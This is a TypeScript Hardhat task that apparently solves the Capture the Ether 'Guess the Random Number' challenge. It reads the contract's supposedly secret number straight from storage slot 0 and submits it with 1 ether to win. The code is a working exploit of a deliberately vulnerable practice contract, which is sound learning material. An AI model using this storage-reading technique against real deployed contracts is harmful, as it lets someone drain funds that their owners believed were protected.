import { utils } from "ethers";
import { task } from "hardhat/config";

const contractAddress = "0x333A270EE190fe4f06aaA35c8b2bd3529Fbf52E4";

task("guess-the-random-number", "Solves the 'Guess the Random Number' challenge", async (_taskArgs, hre) => {
  const factory = await hre.ethers.getContractFactory("GuessTheRandomNumberChallenge");
  const contract = factory.attach(contractAddress);

  const secretNumber = await contract.provider.getStorageAt(contract.address, 0);
  const tx = await contract.guess(secretNumber, { value: utils.parseEther("1") });
  await tx.wait();
});
